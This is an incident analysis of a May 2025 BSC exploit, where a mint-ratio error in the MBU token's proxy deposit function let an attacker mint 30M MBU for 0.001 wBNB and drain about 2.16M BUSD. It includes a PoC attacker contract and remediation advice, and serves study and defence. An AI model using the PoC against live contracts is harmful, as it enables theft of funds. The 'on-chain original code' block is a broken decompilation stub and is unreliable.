# MBU Token — Unlimited Token Minting via Proxy deposit Analysis

| Field | Details |
|------|------|
| **Date** | 2025-05-12 |
| **Protocol** | MBU Token |
| **Chain** | BSC |
| **Loss** | ~2,160,000 BUSD |
| **Attacker** | [0xb32a53af96f7735d47f4b76c525bd5eb02b42600](https://bscscan.com/address/0xb32a53af96f7735d47f4b76c525bd5eb02b42600) |
| **Attack Tx** | [0x2a65254b...](https://bscscan.com/tx/0x2a65254b41b42f39331a0bcc9f893518d6b106e80d9a476b8ca3816325f4a150) |
| **Vulnerable Contract 1** | [0x95e92b09b89cf31fa9f1eca4109a85f88eb08531](https://bscscan.com/address/0x95e92b09b89cf31fa9f1eca4109a85f88eb08531) |
| **Vulnerable Contract 2** | [0x0dfb6ac3a8ea88d058be219066931db2bee9a581](https://bscscan.com/address/0x0dfb6ac3a8ea88d058be219066931db2bee9a581) |
| **Root Cause** | Miscalculated mint ratio in the ERC1967Proxy `deposit` function — a small amount of wBNB mints a disproportionately large amount of MBU tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/MBUToken_exp.sol) |

---

## 1. Vulnerability Overview

The `deposit()` function of the `ERC1967Proxy` contract in the MBU token system accepted wBNB deposits and minted MBU tokens in return. However, a critical error in the mint ratio calculation caused 0.001 wBNB to mint 30,000,000 MBU tokens. The attacker exploited this to mint a massive amount of MBU with a negligible amount of wBNB, then swapped it for BUSD on PancakeSwap, causing approximately $2.16 million in losses.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable deposit: mint ratio calculation error
contract ERC1967Proxy {
    function deposit(address token, uint256 amount) external returns (uint256) {
        IERC20(token).transferFrom(msg.sender, address(this), amount);

        // ❌ Critical ratio error in mint amount calculation
        // 0.001 wBNB → 30,000,000 MBU minted (severely overestimated ratio)
        uint256 mintAmount = calculateMint(amount);
        // mintAmount = amount * WRONG_MULTIPLIER / WRONG_DIVISOR
        // Effectively behaves like: amount * 30_000_000_000 / 1e18

        IERC20(MBU).transfer(msg.sender, mintAmount); // ❌ Excessive minting
        return mintAmount;
    }
}

// ✅ Correct implementation
contract ERC1967Proxy {
    function deposit(address token, uint256 amount) external returns (uint256) {
        IERC20(token).transferFrom(msg.sender, address(this), amount);

        // ✅ Correct ratio: calculate based on BNB price
        uint256 bnbPrice = IOracle(priceOracle).getPrice(token, USD);
        uint256 mintAmount = amount * bnbPrice / MBU_PRICE;
        require(mintAmount <= MAX_MINT_PER_TX, "Exceeds mint limit"); // ✅ Upper bound

        IERC20(MBU).transfer(msg.sender, mintAmount);
        return mintAmount;
    }
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: MBUToken_decompiled.sol
contract MBUToken {
contract MBUToken {

    // Selector: 0x43000814
    function unknownFn_43000814() external  {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► ETH → wBNB conversion (0.001 ETH)
  │
  ├─[2]─► ERC1967Proxy.deposit(wBNB, 0.001 ether) call
  │         └─► ❌ Ratio error: 0.001 wBNB → 30,000,000 MBU minted
  │
  ├─[3]─► MBU tokens swapped for BUSD on PancakeSwap
  │         └─► swapExactTokensForTokensSupportingFeeOnTransferTokens
  │         └─► MBU → BUSD (large-scale swap)
  │
  ├─[4]─► Profit transferred to attacker
  │
  └─[5]─► Net profit: ~2,160,000 BUSD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackerC {
    function attack() external payable {
        // [1] Convert ETH to wBNB
        WETH9(payable(wbnb)).deposit{value: 0.001 ether}();

        // [2] Deposit wBNB into ERC1967Proxy
        IERC20(wbnb).approve(_0x95e9_ERC1967Proxy, 0.001 ether);
        // ❌ 0.001 wBNB → 30,000,000 MBU minted (ratio error)
        I_0x95e9_ERC1967Proxy(_0x95e9_ERC1967Proxy).deposit(wbnb, 0.001 ether);

        // [3] Swap excessively minted MBU for BUSD
        IERC20(MBU).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = MBU;
        path[1] = BUSD;
        IPancakeRouter(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            30_000_000 ether, // Swap 30M MBU for BUSD
            0,
            path,
            address(this),
            block.timestamp
        );

        // [4] Transfer BUSD profit
        IERC20(BUSD).transfer(msg.sender, IERC20(BUSD).balanceOf(address(this)));

        // Pay MEV bot fee (using BlockRazor)
        BlockRazor.call{value: 0.999 ether}("");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Arithmetic Error |
| **Attack Technique** | Exploitation of token mint ratio miscalculation |
| **DASP Category** | Bad Arithmetic |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | Critical |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Mint Ratio Validation**: Validate the token mint ratio against an external price oracle before minting.
2. **Maximum Mint Cap**: Set a strict upper bound on the maximum number of tokens that can be minted per single deposit.
3. **Unit Testing**: Write mint amount tests covering a range of deposit values to catch ratio errors before deployment.
4. **Staging Environment Testing**: Thoroughly validate all calculation logic in the proxy contract's implementation before deployment.

## 7. Lessons Learned

- **A $2.16M arithmetic mistake**: A simple ratio calculation error led to one of the largest losses of its kind.
- **The MEV protection paradox**: It is notable that the attacker used the BlockRazor MEV protection service — essentially protecting the attack transaction itself from front-running by other MEV bots.
- **Proxy contract auditing**: When using the ERC1967 proxy pattern, all mathematical logic in the implementation contract must be rigorously reviewed.